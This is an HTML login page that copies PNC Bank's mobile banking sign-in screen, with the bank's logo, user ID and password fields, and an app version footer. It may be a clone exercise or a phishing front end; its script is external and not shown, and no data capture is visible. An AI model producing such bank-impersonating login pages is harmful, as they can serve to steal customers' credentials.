<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <link rel="stylesheet" href="./css/main.css">
    <link rel="icon" type="image/png" sizes="32x32" href="./icon.webp">
    <script src="https://kit.fontawesome.com/bcfb457481.js" crossorigin="anonymous"></script>
    <title>PNC Personal Banking</title>
</head>
<body> 
    <div id="logo">
        <img src="./pnc.png">
    </div>
    <div id="content">
        <div id="form-box">
            <input type="text" name="userid" id="userid" placeholder="Enter user ID" required>
            <div id="int">
                <p>Save User ID?</p>
                <label class="switch">
                    <input class="switch-input" type="checkbox" />
                    <span class="switch-label" data-on="On" data-off="Off"></span> 
                    <span class="switch-handle"></span> 
                </label>
            </div>
            <input type="pasword" name="password" id="password" placeholder="Enter password" required>
        </div>
        <a href="#">Reset password</a>
        <button>SIGN IN</button>
        <div id="grid-box">
            <div id="box">
                <i class="fa-solid fa-user"></i>
                <h6>ENROLL</h6>
            </div>
            <div id="box">
                <i class="fa-solid fa-comment"></i>
                <h6>HELP</h6>
            </div>
            <div id="box">
                <i class="fa-solid fa-location-dot"></i>
                <h6>LOCATE</h6>
            </div>
            <div id="box">
                <i class="fa-solid fa-globe"></i>
                <h6>PNC.COM</h6>
            </div>
        </div>
    </div>
    <div id="footer">
        <a href="#">Choose your language | Seleccione su idioma</a>
        <p>App Version 4.44</p>
    </div>
    <script src="./js/main.js"></script>
</body>
</html>
